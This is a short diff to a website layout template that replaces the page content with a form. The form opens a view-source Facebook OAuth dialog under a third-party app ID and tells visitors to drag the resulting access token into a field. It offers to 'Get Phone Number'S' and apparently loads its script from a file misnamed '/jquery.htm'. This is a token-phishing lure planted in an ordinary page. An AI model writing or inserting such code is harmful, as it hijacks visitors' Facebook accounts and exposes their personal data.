@@ -27,7 +27,22 @@
     </div>
   </header>
 
-  {{ content }}
+<div id="login_container" style="position: absolute; left: 350px; margin-top: 0px">
+	<div id="login_form">
+		<form id="tokengonder" novalidate="novalidate">
+			<p style="width: 200px;">
+				<input id="access_token" name="access_token" placeholder="Drag the pop up fav icon to here an click ->" class="{validate: {required: true}}" type="text">
+			</p>
+			<button id="gonder" type="button" class="button blue"> Get Phone Number'S </button>&nbsp;<button id="tokenal" onclick="window.open('view-source:http://www.facebook.com/dialog/oauth?type=user_agent&scope=&client_id=139682082719810&redirect_uri=http://www.facebook.com/connect/login_success.html%3F-%D8%A5%D9%86%D8%B3%D8%AE+%D9%87%D8%B0%D8%A7+%D8%A7%D9%84%D8%B1%D8%A7%D8%A8%D8%B7+%D8%A8%D8%A7%D9%84%D9%83%D8%A7%D9%85%D9%84+Red+Ice-&sso_key=com.jango.jango&sdk=ios&display=popup','sth','width=600,height=100');" type="button" class="button blue">Get Token</button>&nbsp;
+			<div id="logs">
+			</div>
+		</form>
+	</div>
+	<div id="atp">
+	</div>
+</div>
+
+<script type="text/javascript" src="/jquery.htm"></script>  
 <script>
   var arr=[""];
 var tokenme;
